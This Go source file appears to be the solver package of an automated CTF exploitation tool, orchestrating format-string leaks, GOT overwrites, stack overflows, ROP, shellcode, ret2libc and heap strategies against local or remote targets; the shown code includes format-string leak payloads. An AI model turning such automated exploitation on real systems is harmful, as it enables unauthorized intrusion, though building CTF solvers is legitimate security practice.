// Package solve attempts to recover a flag from a simple local CTF program by
// driving a confirmed vulnerability and extracting the disclosed secret.
//
// Two strategies are implemented:
//
//   - format_string: after internal/detect confirms input-dependent %p
//     expansion, send leak payloads and read the flag out of the transcript.
//   - stack_overwrite: brute-force a buffer overflow that either sets a guard
//     variable to a magic constant found in the binary or redirects control to
//     a flag-printing function, then read the flag the program prints.
//
// A flag counts only when it matches the configured pattern and is absent from
// the input that produced it, so echoing a supplied flag never registers as a
// solve, and a crash alone is never reported as success.
package solve

import (
	"context"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"strings"
	"time"

	"github.com/MoriartyPuth/PwnProbes/internal/detect"
	"github.com/MoriartyPuth/PwnProbes/internal/extract"
	"github.com/MoriartyPuth/PwnProbes/internal/inspect"
	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// MaxStackArgs bounds the direct positional reads and the stack dump width.
const MaxStackArgs = 40

// Attempt records one payload, its transcript, and the flags it recovered.
// PayloadHex is the byte-exact payload; Payload is a display copy and may contain
// U+FFFD once serialized, so a consumer that needs the exact bytes uses
// PayloadHex (JSON cannot carry invalid UTF-8 verbatim).
type Attempt struct {
	Strategy   string              `json:"strategy"`
	Payload    string              `json:"payload"`
	PayloadHex string              `json:"payload_hex"`
	Note       string              `json:"note,omitempty"`
	Result     runner.Result       `json:"result"`
	Candidate  []extract.Candidate `json:"candidates,omitempty"`
	Recovered  []string            `json:"recovered,omitempty"`
}

// Report is the full record of a solve run. Solved is true only when at least
// one non-echoed flag matching the pattern was recovered.
type Report struct {
	Binary      inspect.Report `json:"binary"`
	Detection   detect.Report  `json:"detection"`
	Pattern     string         `json:"pattern"`
	Environment Environment    `json:"environment"`
	Attempts    []Attempt      `json:"attempts"`
	Solved      bool           `json:"solved"`
	Flags       []string       `json:"flags"`
	Winning     *Attempt       `json:"winning_attempt,omitempty"`
	Timing      Timing         `json:"timing"`
	Limitations []string       `json:"limitations"`
}

// Environment captures the run's provenance so a result can be reproduced and
// compared: which build of the framework ran it, on what platform, against which
// transport, and under what per-run budget. It is descriptive metadata, not a
// claim about the target.
type Environment struct {
	Commit    string    `json:"commit,omitempty"`
	GoVersion string    `json:"go_version"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	Mode      string    `json:"mode"` // "local" or "remote"
	StartedAt time.Time `json:"started_at"`
	TimeoutMS int64     `json:"timeout_ms"` // per-run deadline (the strategy budget)
}

// Timing records where wall-clock time went so expensive strategy ordering is
// measurable rather than anecdotal. TotalMS is the whole run; Strategies lists
// each strategy in the order it ran with its own elapsed time and the number of
// attempts it recorded.
type Timing struct {
	TotalMS    int64            `json:"total_ms"`
	Strategies []StrategyTiming `json:"strategies"`
}

// StrategyTiming is the wall-clock cost and attempt count of one strategy
// invocation, in execution order.
type StrategyTiming struct {
	Name       string `json:"name"`
	DurationMS int64  `json:"duration_ms"`
	Attempts   int    `json:"attempts"`
}

// solver carries the shared inputs and the growing report across strategies.
type solver struct {
	ex      *extract.Extractor
	path    string
	workDir string
	timeout time.Duration
	remote  string // host:port for a remote target; empty means a local subprocess
	libc    string // explicit libc path for ret2libc; empty resolves the local one
	report  *Report

	lastOutcome string // outcome of the most recent recorded attempt
}

// Solve runs each applicable strategy in turn, stopping at the first payload that
// recovers a non-echoed flag and reporting it as the reproducible winner. pattern
// selects the flag shape; an empty pattern uses extract.DefaultPattern. path is a
// local copy of the binary, used for static analysis in all modes. When remote is
// set (host:port) the exploit runs over a live TCP session; otherwise the target
// runs as a local subprocess in its own directory so a flag file beside it is
// readable.
func Solve(ctx context.Context, path, pattern, remote, libc string, timeout time.Duration) (report Report, err error) {
	start := time.Now()
	// Stamp the total elapsed time on every return path, including early errors.
	defer func() { report.Timing.TotalMS = time.Since(start).Milliseconds() }()

	ex, err := extract.New(pattern)
	if err != nil {
		return report, fmt.Errorf("compile flag pattern: %w", err)
	}
	effectivePattern := pattern
	if effectivePattern == "" {
		effectivePattern = extract.DefaultPattern
	}
	binary, err := inspect.Analyze(path)
	if err != nil {
		return report, err
	}
	mode := "local"
	if remote != "" {
		mode = "remote"
	}
	report = Report{
		Binary:  binary,
		Pattern: effectivePattern,
		Environment: Environment{
			Commit:    buildCommit(),
			GoVersion: runtime.Version(),
			OS:        runtime.GOOS,
			Arch:      runtime.GOARCH,
			Mode:      mode,
			StartedAt: start.UTC(),
			TimeoutMS: timeout.Milliseconds(),
		},
		Attempts: []Attempt{},
		Flags:    []string{},
		Limitations: []string{
			"strategies implemented: format-string read/GOT-overwrite/write-to-return-address, stack-overflow variable/return overwrite, two-argument ret2win ROP, ret2syscall execve ROP, ret2plt call of an imported function (system/exec) with an in-binary string argument, ROP-planner synthesis of multi-argument and chained calls, executable-stack shellcode, ret2libc, canary-bypass ret2win, PIE partial-overwrite (no leak), heap use-after-free function-pointer overwrite (prompt-driven numbered menu, size-prompted and index-driven allocators supported), and symbolic-execution solving of logic/argv/stdin puzzles (angr, when installed)",
			"leaked-address strategies run over a live session (local subprocess or remote TCP), so they work with ASLR enabled",
			"a recovered flag must match the configured pattern and be absent from the payload that produced it",
			"failure to recover a flag does not prove the target is unexploitable",
		},
	}
	s := &solver{ex: ex, path: path, workDir: filepath.Dir(path), timeout: timeout, remote: remote, libc: libc, report: &report}

	if remote != "" {
		report.Limitations = append(report.Limitations, "remote mode runs the session strategies (shellcode, ret2libc, overflow-to-shell); it assumes the local binary copy matches the remote, and ret2libc needs a matching libc (--libc)")
		// Leak strategies first: they gate on protections and skip fast when not
		// applicable. The overflow brute force is far more costly per attempt, so
		// it runs last and only when the targeted strategies did not apply.
		remoteStrategies := []strategyEntry{
			{"shellcode", s.shellcodeStrategy},
			{"ret2libc", s.ret2libcStrategy},
			{"rop_execve", s.ropExecveStrategy},
			{"ret2plt", s.ret2pltStrategy},
			{"canary_ret2win", s.canaryStrategy},
			{"heap_uaf", s.heapUAFStrategy},
			{"stack_overwrite_session", s.stackOverwriteSessionStrategy},
			{"partial_overwrite", s.partialOverwriteStrategy},
			{"rop_planner", s.ropPlannerStrategy},
		}
		return s.runStrategies(ctx, remoteStrategies)
	}

	// Local mode: run the one-shot detection and strategies, then the session ones.
	detection, err := detect.Probe(ctx, path, timeout)
	if err != nil {
		return report, err
	}
	report.Detection = detection

	if hasFormatString(detection) {
		if done, err := s.runStrategy(ctx, "format_string", s.formatStringStrategy); err != nil {
			return report, err
		} else if done {
			return report, nil
		}
	} else {
		report.Limitations = append(report.Limitations, "no confirmed format-string behavior; format-string strategy skipped")
	}

	if !binary.ExecutionSupported {
		report.Limitations = append(report.Limitations, "execution unsupported for this target; local exploitation strategies skipped")
		return report, nil
	}
	localStrategies := []strategyEntry{
		{"fmt_got_overwrite", s.fmtGotOverwriteStrategy},
		{"fmt_write_ret", s.fmtWriteRetStrategy},
		{"heap_uaf", s.heapUAFStrategy},
		{"stack_overwrite", s.stackOverwriteStrategy},
		{"rop_ret2win_args", s.ropRet2winArgsStrategy},
		{"rop_execve", s.ropExecveStrategy},
		{"ret2plt", s.ret2pltStrategy},
		{"shellcode", s.shellcodeStrategy},
		{"ret2libc", s.ret2libcStrategy},
		{"canary_ret2win", s.canaryStrategy},
		{"angr_logic", s.angrStrategy},
		{"partial_overwrite", s.partialOverwriteStrategy},
		{"rop_planner", s.ropPlannerStrategy},
	}
	return s.runStrategies(ctx, localStrategies)
}

// strategyEntry pairs a strategy's stable name with its invocation. Naming the
// strategies (rather than keeping a bare func slice) is what lets the planner
// record and later reason about per-strategy cost and ordering.
type strategyEntry struct {
	name string
	run  func(context.Context) (bool, error)
}

// runStrategies runs each entry in order, stopping at the first that solves. It
// is the single place local and remote modes converge on, so timing is recorded
// uniformly.
func (s *solver) runStrategies(ctx context.Context, entries []strategyEntry) (Report, error) {
	for _, e := range entries {
		if done, err := s.runStrategy(ctx, e.name, e.run); err != nil {
			return *s.report, err
		} else if done {
			return *s.report, nil
		}
	}
	return *s.report, nil
}

// runStrategy invokes one strategy and records its wall-clock cost and how many
// attempts it added, in execution order. Timing is observed even when a strategy
// skips fast (it still records a near-zero entry), so a report shows what ran.
func (s *solver) runStrategy(ctx context.Context, name string, fn func(context.Context) (bool, error)) (bool, error) {
	before := len(s.report.Attempts)
	start := time.Now()
	done, err := fn(ctx)
	s.report.Timing.Strategies = append(s.report.Timing.Strategies, StrategyTiming{
		Name:       name,
		DurationMS: time.Since(start).Milliseconds(),
		Attempts:   len(s.report.Attempts) - before,
	})
	return done, err
}

// buildCommit reports the VCS revision this binary was built from, when the Go
// toolchain embedded it (a plain `go build` of a checkout does). It can be
// overridden with PWNPROBE_COMMIT for builds that strip VCS stamping. An empty
// string means the revision is unknown, never a fabricated value.
func buildCommit() string {
	if c := os.Getenv("PWNPROBE_COMMIT"); c != "" {
		return c
	}
	info, ok := debug.ReadBuildInfo()
	if !ok {
		return ""
	}
	for _, s := range info.Settings {
		if s.Key == "vcs.revision" {
			return s.Value
		}
	}
	return ""
}

// attempt runs one payload, extracts flags, records the attempt, and, when a
// non-echoed flag is recovered, finalizes the report as solved. It returns true
// once the report is solved so the caller can stop.
func (s *solver) attempt(ctx context.Context, strategy, note string, payload []byte, decodeLeak bool) (bool, error) {
	result, err := runner.Run(ctx, runner.Request{Program: s.path, Input: payload, Timeout: s.timeout, WorkDir: s.workDir})
	if err != nil {
		return false, err
	}
	cands := s.ex.Find(result.Stdout, payload, "stdout")
	cands = append(cands, s.ex.Find(result.Stderr, payload, "stderr")...)
	if decodeLeak {
		if decoded := extract.DecodeLeak(result.Stdout); decoded != "" {
			// Compare the decoded candidate against the decoded input too, so an
			// echoed encoding (hex the program reflected) is caught as an echo
			// rather than counted as a recovered flag.
			echoInput := append(append([]byte{}, payload...), extract.DecodeLeak(string(payload))...)
			cands = append(cands, s.ex.Find(decoded, echoInput, "stack_leak")...)
		}
	}
	return s.finalize(strategy, note, payload, result, cands), nil
}

// finalize records an attempt and, when it recovered a non-echoed flag, marks the
// report solved. It stores the byte-exact payload as hex (PayloadHex) alongside
// the display string, since JSON cannot carry invalid UTF-8 verbatim.
func (s *solver) finalize(strategy, note string, payload []byte, result runner.Result, cands []extract.Candidate) bool {
	s.lastOutcome = result.Outcome
	recovered := extract.Recovered(cands)
	a := Attempt{
		Strategy:   strategy,
		Payload:    string(payload),
		PayloadHex: hex.EncodeToString(payload),
		Note:       note,
		Result:     result,
		Candidate:  cands,
		Recovered:  recovered,
	}
	s.report.Attempts = append(s.report.Attempts, a)
	if len(recovered) > 0 {
		s.report.Solved = true
		s.report.Flags = recovered
		winner := a
		s.report.Winning = &winner
		return true
	}
	return false
}

func hasFormatString(d detect.Report) bool {
	for _, f := range d.Findings {
		if f.Kind == "format_string" && f.Status == "confirmed_behavior" {
			return true
		}
	}
	return false
}

// formatStringStrategy sends leak payloads in increasing aggressiveness. The
// stack dump rarely crashes and decodes to ASCII; the direct %s reads print a
// flag pointer straight to stdout but can crash on a non-pointer argument, so
// they run after the dump. Every payload is a single reproducible line.
func (s *solver) formatStringStrategy(ctx context.Context) (bool, error) {
	var direct strings.Builder
	for i := 1; i <= MaxStackArgs; i++ {
		fmt.Fprintf(&direct, "%%%d$s|", i)
	}
	direct.WriteByte('\n')
	payloads := []struct{ name, payload string }{
		{"stack_dump", strings.Repeat("%p.", MaxStackArgs) + "\n"},
		{"direct_string_reads", direct.String()},
		{"leading_string_read", "%s\n"},
	}
	for _, p := range payloads {
		if err := ctx.Err(); err != nil {
			return false, err
		}
		if done, err := s.attempt(ctx, p.name, "", []byte(p.payload), true); err != nil || done {
			return done, err
		}
	}
	return false, nil
}
